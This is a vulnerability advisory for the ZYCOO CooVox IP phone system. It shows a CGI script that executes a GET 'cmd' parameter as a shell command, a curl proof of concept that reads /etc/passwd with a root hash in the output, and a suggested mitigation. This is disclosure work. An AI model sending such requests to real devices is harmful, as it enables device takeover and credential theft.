@@ -1,0 +1,61 @@
+Vulnerable hardware : ZYCOO IP phone system
+Vendor : zycoo.com
+Author : Ahmed sultan (@0x4148)
+Email : 0x4148@gmail.com
+
+Summary : According to the vendor's site , 
+CooVox Series IP Phone System is the most innovative solution for VoIP telecommunication in SMB (Small and Medium-sized Business) market.
+They provide not only traditional PBX functions such as automated attendant and voicemail,
+but also offer many advance telephony features, including remote extensions, remote office connection,
+IVR, call recording, call detail records(CDR)…
+
+Vulnerable file : /www/cgi-bin/system_cmd.cgi
+
+Code shot : 
+
+#!/bin/hush
+printf '\r\n'
+if [ -n "$REQUEST_METHOD" ]; then
+        case "$REQUEST_METHOD" in
+        (GET)
+        if [ -n "$QUERY_STRING" ]; then
+        for args in `echo "$QUERY_STRING" | tr "&" " "`
+        do
+                param=`echo "$args" | cut -d "=" -f 1`
+                value=`echo "$args" | cut -d "=" -f 2`
+                eval "export $param=$value"
+        done
+        fi
+        ;;
+  esac
+fi
+INI_FILE=/etc/asterisk/manager.conf
+INI_SECTION=$username
+eval `sed -e 's/[[:space:]]*\=[[:space:]]*/=/g' \
+    -e 's/;.*$//' \
+    -e 's/[[:space:]]*$//' \
+    -e 's/^[[:space:]]*//' \
+    -e "s/^\(.*\)=\([^\"']*\)$/\1=\'\2\'/" \
+   < $INI_FILE \
+    | sed -n -e "/^\[$INI_SECTION\]/,/^\s*\[/{/^[^;].*\=.*/p;}"`
+password="`/etc/scripts/decodeURI $password`"
+[ -z "$secret" ] && secret=`/etc/scripts/getkeyvalue.sh ${INI_SECTION} vmsecret`
+if [ "$password" = "$secret" ]; then
+        cmd=`echo $cmd | sed 's/%20/ /g'`
+#       cmd=`echo $cmd | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g;s/?r//g' | xargs echo`
+        $cmd
+
+the GET parameter cmd is freely available to directly execute system commands with no prior required authentication
+which lead to full hardware takeover
+
+POC
+[0x4148:/R1z]# curl http://server:9999/cgi-bin/system_cmd.cgi\?cmd\='cat%20/etc/passwd'
+root:$1$C6ouMLFa$pb2/Bu1bcWpBNcX38jTva0:0:0:root:/:/bin/sh
+nobody:x:99:99:Nobody::
+
+Also by reading file /etc/asterisk/manager.conf
+hardware admin's password can be obtained in plain text
+
+Fixing?
+Unfortunately the hardware frontend really depend on this file , and the vendor is super lazy on replying on the emails regarding this vulnerability
+so , best fixation for now is enabling the web interface browsing from the local network only
